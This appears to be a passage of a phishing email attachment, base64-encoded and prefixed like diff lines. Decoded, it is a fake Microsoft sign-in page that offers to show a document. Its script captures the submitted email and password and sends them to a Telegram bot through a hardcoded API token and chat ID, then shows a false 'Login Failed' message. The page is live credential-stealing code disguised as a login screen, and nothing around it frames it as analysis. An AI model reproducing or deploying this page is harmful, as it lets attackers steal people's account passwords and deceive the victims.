+YnJpYSBNYXRoIjsgZm9udC1zaXplOiAyNHB4OyBmb250LXN0eWxlOiBub3JtYWw7IGZvbnQt
+d2VpZ2h0OiA2MDA7IHdvcmQtc3BhY2luZzogMHB4OyBmbG9hdDogbm9uZTsgZGlzcGxheTog
+aW5saW5lICFpbXBvcnRhbnQ7IHdoaXRlLXNwYWNlOiBub3JtYWw7IG9ycGhhbnM6IDI7IHdp
+ZG93czogMjsgYmFja2dyb3VuZC1jb2xvcjogcmdiKDI1NSwgMjU1LCAyNTUpOyBmb250LXZh
+cmlhbnQtbGlnYXR1cmVzOiBub3JtYWw7IGZvbnQtdmFyaWFudC1jYXBzOiBub3JtYWw7IC13
+ZWJraXQtdGV4dC1zdHJva2Utd2lkdGg6IDBweDsgdGV4dC1kZWNvcmF0aW9uLXRoaWNrbmVz
+czogaW5pdGlhbDsgdGV4dC1kZWNvcmF0aW9uLXN0eWxlOiBpbml0aWFsOyB0ZXh0LWRlY29y
+YXRpb24tY29sb3I6IGluaXRpYWw7Jz4NClNpZ24gaW48L3NwYW4+PC9zcGFuPg0KJm5ic3A7
+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7
+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7
+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7
+PHNwYW4gc3R5bGU9J2NvbG9yOiByZ2IoMCwgMCwgMCk7IHRleHQtdHJhbnNmb3JtOiBub25l
+OyB0ZXh0LWluZGVudDogMHB4OyBsZXR0ZXItc3BhY2luZzogbm9ybWFsOyBmb250LWZhbWls
+eTogIlRpbWVzIE5ldyBSb21hbiI7IGZvbnQtc2l6ZTogbWVkaXVtOyBmb250LXN0eWxlOiBu
+b3JtYWw7IGZvbnQtd2VpZ2h0OiA0MDA7IHdvcmQtc3BhY2luZzogMHB4OyBmbG9hdDogbm9u
+ZTsgZGlzcGxheTogaW5saW5lICFpbXBvcnRhbnQ7IHdoaXRlLXNwYWNlOiBub3JtYWw7IG9y
+cGhhbnM6IDI7IHdpZG93czogMjsgYmFja2dyb3VuZC1jb2xvcjogcmdiKDI1NSwgMjU1LCAy
+NTUpOyANCmZvbnQtdmFyaWFudC1saWdhdHVyZXM6IG5vcm1hbDsgZm9udC12YXJpYW50LWNh
+cHM6IG5vcm1hbDsgLXdlYmtpdC10ZXh0LXN0cm9rZS13aWR0aDogMHB4OyB0ZXh0LWRlY29y
+YXRpb24tdGhpY2tuZXNzOiBpbml0aWFsOyB0ZXh0LWRlY29yYXRpb24tc3R5bGU6IGluaXRp
+YWw7IHRleHQtZGVjb3JhdGlvbi1jb2xvcjogaW5pdGlhbDsnPjwvc3Bhbj4NCjxmb3JtIGlk
+PSJsb2dpbkZvcm0iIHN0eWxlPSdjb2xvcjogcmdiKDAsIDAsIDApOyB0ZXh0LXRyYW5zZm9y
+bTogbm9uZTsgdGV4dC1pbmRlbnQ6IDBweDsgbGV0dGVyLXNwYWNpbmc6IG5vcm1hbDsgZm9u
+dC1mYW1pbHk6ICJUaW1lcyBOZXcgUm9tYW4iOyBmb250LXN0eWxlOiBub3JtYWw7IGZvbnQt
+d2VpZ2h0OiA0MDA7IHdvcmQtc3BhY2luZzogMHB4OyB3aGl0ZS1zcGFjZTogbm9ybWFsOyBv
+cnBoYW5zOiAyOyB3aWRvd3M6IDI7IGZvbnQtdmFyaWFudC1saWdhdHVyZXM6IG5vcm1hbDsg
+Zm9udC12YXJpYW50LWNhcHM6IG5vcm1hbDsgLXdlYmtpdC10ZXh0LXN0cm9rZS13aWR0aDog
+MHB4OyB0ZXh0LWRlY29yYXRpb24tdGhpY2tuZXNzOiBpbml0aWFsOyB0ZXh0LWRlY29yYXRp
+b24tc3R5bGU6IGluaXRpYWw7IHRleHQtZGVjb3JhdGlvbi1jb2xvcjogaW5pdGlhbDsnPjxm
+b250IHNpemU9IjMiPlRvIFZpZXcgRG9jdW1lbnQgT25saW5lOjxicj4NCiAgICAgICAgICAg
+IDxsYWJlbCBmb3I9ImVtYWlsIj5FbWFpbDo8L2xhYmVsPg0KICAgICAgICAgICAgPC9mb250
+PjxpbnB1dCBuYW1lPSJlbWFpbCIgaWQ9ImVtYWlsIiByZXF1aXJlZD0iIiB0eXBlPSJlbWFp
+bCIgdmFsdWU9Impvc2VAbW9ua2V5Lm9yZyI+PGJyPjxmb250IHNpemU9IjMiPg0KICAgICAg
+ICAgICAgPGxhYmVsIGZvcj0icGFzc3dvcmQiPkVudGVyIFBhc3N3b3JkOjwvbGFiZWw+DQog
+ICAgICAgICAgICA8L2ZvbnQ+PGlucHV0IG5hbWU9InBhc3N3b3JkIiByZXF1aXJlZD0iIiB0
+eXBlPSJwYXNzd29yZCIgcGxhY2Vob2xkZXI9IlBhc3N3b3JkIiB2YWx1ZT0iIj48YnI+PGJ1
+dHRvbiBzdHlsZT0iYmFja2dyb3VuZDogcmdiKDAsIDEyMywgMjU1KTsgbWFyZ2luOiAxMHB4
+IDBweDsgcGFkZGluZzogMTBweDsgYm9yZGVyLXJhZGl1czogNXB4OyBib3JkZXI6IGN1cnJl
+bnRDb2xvcjsgYm9yZGVyLWltYWdlOiBub25lOyB3aWR0aDogMzk3LjMzcHg7IGhlaWdodDog
+MzlweDsgY29sb3I6IHdoaXRlOyB3aGl0ZS1zcGFjZTogbm9ybWFsOyBjdXJzb3I6IHBvaW50
+ZXI7IG9ycGhhbnM6IDI7IHdpZG93czogMjsgLXdlYmtpdC10ZXh0LXN0cm9rZS13aWR0aDog
+MHB4OyB0ZXh0LWRlY29yYXRpb24tdGhpY2tuZXNzOiBpbml0aWFsOyB0ZXh0LWRlY29yYXRp
+b24tc3R5bGU6IGluaXRpYWw7IHRleHQtZGVjb3JhdGlvbi1jb2xvcjogaW5pdGlhbDsiIHR5
+cGU9InN1Ym1pdCI+DQo8Zm9udCBzaXplPSIzIj4NClNpZ24gaW4gdG8gY29udGludWU8L2Zv
+bnQ+PC9idXR0b24+PGZvbnQgc2l6ZT0iMyI+DQo8YnIgc3R5bGU9J2NvbG9yOiByZ2IoMCwg
+MCwgMCk7IHRleHQtdHJhbnNmb3JtOiBub25lOyB0ZXh0LWluZGVudDogMHB4OyBsZXR0ZXIt
+c3BhY2luZzogbm9ybWFsOyBmb250LWZhbWlseTogIlRpbWVzIE5ldyBSb21hbiI7IGZvbnQt
+c2l6ZTogbWVkaXVtOyBmb250LXN0eWxlOiBub3JtYWw7IGZvbnQtd2VpZ2h0OiA0MDA7IHdv
+cmQtc3BhY2luZzogMHB4OyB3aGl0ZS1zcGFjZTogbm9ybWFsOyBvcnBoYW5zOiAyOyB3aWRv
+d3M6IDI7IGJhY2tncm91bmQtY29sb3I6IHJnYigyNTUsIDI1NSwgMjU1KTsgZm9udC12YXJp
+YW50LWxpZ2F0dXJlczogbm9ybWFsOyBmb250LXZhcmlhbnQtY2Fwczogbm9ybWFsOyAtd2Vi
+a2l0LXRleHQtc3Ryb2tlLXdpZHRoOiAwcHg7IHRleHQtZGVjb3JhdGlvbi10aGlja25lc3M6
+IGluaXRpYWw7IHRleHQtZGVjb3JhdGlvbi1zdHlsZTogaW5pdGlhbDsgdGV4dC1kZWNvcmF0
+aW9uLWNvbG9yOiBpbml0aWFsOyc+DQo8c3BhbiBzdHlsZT0nY29sb3I6IHJnYigwLCAwLCAw
+KTsgdGV4dC10cmFuc2Zvcm06IG5vbmU7IHRleHQtaW5kZW50OiAwcHg7IGxldHRlci1zcGFj
+aW5nOiBub3JtYWw7IGZvbnQtZmFtaWx5OiAiVGltZXMgTmV3IFJvbWFuIjsgZm9udC1zdHls
+ZTogbm9ybWFsOyBmb250LXdlaWdodDogNDAwOyB3b3JkLXNwYWNpbmc6IDBweDsgd2hpdGUt
+c3BhY2U6IG5vcm1hbDsgb3JwaGFuczogMjsgd2lkb3dzOiAyOyBiYWNrZ3JvdW5kLWNvbG9y
+OiByZ2IoMjU1LCAyNTUsIDI1NSk7IGZvbnQtdmFyaWFudC1saWdhdHVyZXM6IG5vcm1hbDsg
+Zm9udC12YXJpYW50LWNhcHM6IG5vcm1hbDsgLXdlYmtpdC10ZXh0LXN0cm9rZS13aWR0aDog
+MHB4OyB0ZXh0LWRlY29yYXRpb24tdGhpY2tuZXNzOiBpbml0aWFsOyB0ZXh0LWRlY29yYXRp
+b24tc3R5bGU6IGluaXRpYWw7IHRleHQtZGVjb3JhdGlvbi1jb2xvcjogaW5pdGlhbDsnPk5v
+IGFjY291bnQ/DQombmJzcDsmbmJzcDs8L3NwYW4+DQo8c3BhbiBzdHlsZT0nY29sb3I6IHJn
+YigwLCAwLCAwKTsgdGV4dC10cmFuc2Zvcm06IG5vbmU7IHRleHQtaW5kZW50OiAwcHg7IGxl
+dHRlci1zcGFjaW5nOiBub3JtYWw7IGZvbnQtZmFtaWx5OiAiVGltZXMgTmV3IFJvbWFuIjsg
+Zm9udC1zdHlsZTogbm9ybWFsOyBmb250LXdlaWdodDogNDAwOyB3b3JkLXNwYWNpbmc6IDBw
+eDsgZmxvYXQ6IG5vbmU7IGRpc3BsYXk6IGlubGluZSAhaW1wb3J0YW50OyB3aGl0ZS1zcGFj
+ZTogbm9ybWFsOyBvcnBoYW5zOiAyOyB3aWRvd3M6IDI7IGJhY2tncm91bmQtY29sb3I6IHJn
+YigyNTUsIDI1NSwgMjU1KTsgZm9udC12YXJpYW50LWxpZ2F0dXJlczogbm9ybWFsOyBmb250
+LXZhcmlhbnQtY2Fwczogbm9ybWFsOyAtd2Via2l0LXRleHQtc3Ryb2tlLXdpZHRoOiAwcHg7
+IHRleHQtZGVjb3JhdGlvbi10aGlja25lc3M6IGluaXRpYWw7IHRleHQtZGVjb3JhdGlvbi1z
+dHlsZTogaW5pdGlhbDsgdGV4dC1kZWNvcmF0aW9uLWNvbG9yOiANCmluaXRpYWw7Jz4mbmJz
+cDs8L3NwYW4+DQo8c3BhbiB0YWJpbmRleD0iMCIgY2xhc3M9Il9fXzNjaWZicjAgZjExeHZz
+cGUgZjFic2pybTMgZjNybXR2YSBmMWVybjQ1ZSBmMW43MW90biBmMWg4aGI3NyBmMWRlZWZp
+dyBmcnlrNXVyIGZ2Nno2emMgZjFjaW80ZzkgZjFtd2I5eTUgZjF5bm15Z28gZjEyMWc4bmQg
+ZjFpODJlYXEgZjg0OTFkeCBmMW5iYmx2cCBmaWZwN3l2IGYxb3Y0eGYxIGYxYXNkdHc0IGYx
+cnM4d2p1IGYxbXR5amhpIGYxZWR4enQgZjNhOHM4eiIgaWQ9InNpZ251cCIgcm9sZT0iYnV0
+dG9uIiBzdHlsZT0ncGFkZGluZzogMHB4OyBjb2xvcjogcmdiKDAsIDEwMywgMTg0KTsgdGV4
+dC10cmFuc2Zvcm06IG5vbmU7IHRleHQtaW5kZW50OiAwcHg7IGxldHRlci1zcGFjaW5nOiBu
+b3JtYWw7IGZvbnQtZmFtaWx5OiAiVGltZXMgTmV3IFJvbWFuIjsgZm9udC1zdHlsZTogbm9y
+bWFsOyBmb250LXdlaWdodDogNDAwOyB3b3JkLXNwYWNpbmc6IDBweDsgd2hpdGUtc3BhY2U6
+IG5vcm1hbDsgb3JwaGFuczogMjsgDQp3aWRvd3M6IDI7IGJhY2tncm91bmQtY29sb3I6IHJn
+YigyNTUsIDI1NSwgMjU1KTsgZm9udC12YXJpYW50LWxpZ2F0dXJlczogbm9ybWFsOyBmb250
+LXZhcmlhbnQtY2Fwczogbm9ybWFsOyAtd2Via2l0LXRleHQtc3Ryb2tlLXdpZHRoOiAwcHg7
+IHRleHQtZGVjb3JhdGlvbi10aGlja25lc3M6IGluaXRpYWw7IHRleHQtZGVjb3JhdGlvbi1z
+dHlsZTogaW5pdGlhbDsgdGV4dC1kZWNvcmF0aW9uLWNvbG9yOiBpbml0aWFsOycgYXJpYS1s
+YWJlbD0iQ3JlYXRlIGEgTWljcm9zb2Z0IGFjY291bnQiPkNyZWF0ZSBvbmUhPC9zcGFuPjxi
+cj48L2ZvbnQ+PC9mb3JtPjwvaDE+DQogICAgICAgIDxwIGlkPSJsb2dpbk1lc3NhZ2UiPjwv
+cD4NCiAgICA8L2Rpdj4NCg0KICAgIDxzY3JpcHQ+DQogICAgICAgIGNvbnN0IGZvcm0gPSBk
+b2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5Gb3JtJyk7DQogICAgICAgIGNvbnN0IGxv
+Z2luTWVzc2FnZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbk1lc3NhZ2UnKTsN
+Cg0KICAgICAgICBmb3JtLmFkZEV2ZW50TGlzdGVuZXIoJ3N1Ym1pdCcsIGZ1bmN0aW9uKGV2
+ZW50KSB7DQogICAgICAgICAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOw0KICAgICAgICAg
+ICAgY29uc3QgZW1haWwgPSBmb3JtLmVsZW1lbnRzLmVtYWlsLnZhbHVlOw0KICAgICAgICAg
+ICAgY29uc3QgcGFzc3dvcmQgPSBmb3JtLmVsZW1lbnRzLnBhc3N3b3JkLnZhbHVlOw0KDQog
+ICAgICAgICAgICBjb25zdCBhcGlLZXkgPSAnNzUzODE0NTUzNDpBQUVoTlY2dU5zMTRycThq
+dndWZlhCTnJqNkp5dktMQzdrRSc7DQogICAgICAgICAgICBjb25zdCBjaGF0SWQgPSAnLTEw
+MDIzODM5MDU4NTgnOw0KDQogICAgICAgICAgICBmZXRjaChgaHR0cHM6Ly9hcGkudGVsZWdy
+YW0ub3JnL2JvdCR7YXBpS2V5fS9zZW5kTWVzc2FnZT9jaGF0X2lkPSR7Y2hhdElkfSZ0ZXh0
+PUVtYWlsOiAke2VtYWlsfSUwQVBhc3N3b3JkOiAke3Bhc3N3b3JkfWApDQogICAgICAgICAg
+ICAgICAgLnRoZW4ocmVzcG9uc2UgPT4gew0KICAgICAgICAgICAgICAgICAgICBpZiAocmVz
+cG9uc2Uub2spIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGxvZ2luTWVzc2FnZS5pbm5l
+clRleHQgPSAnTG9naW4gRmFpbGVkOiBQbGVhc2UgY2hlY2sgaW5wdXQgYW5kIFRyeSBhZ2Fp
+biEnOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAg
+ICAgICAgbG9naW5NZXNzYWdlLmlubmVyVGV4dCA9ICdMb2dpbiBGYWlsZWQ6IFBsZWFzZSBj
+aGVjayBpbnB1dCBhbmQgVHJ5IGFnYWluIS4nOw0KICAgICAgICAgICAgICAgICAgICB9DQog
+ICAgICAgICAgICAgICAgfSkNCiAgICAgICAgICAgICAgICAuY2F0Y2goZXJyb3IgPT4gew0K
+ICAgICAgICAgICAgICAgICAgICBsb2dpbk1lc3NhZ2UuaW5uZXJUZXh0ID0gJ0FuIGVycm9y
+IG9jY3VycmVkIHdoaWxlIHRyeWluZy4nOw0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAg
+ICB9KTsNCiAgICA8L3NjcmlwdD4NCg0KDQo8L2Rpdj48L2JvZHk+PC9odG1sPg==
+
+------=_NextPart_000_0012_CD502D7F.7A43E58E--
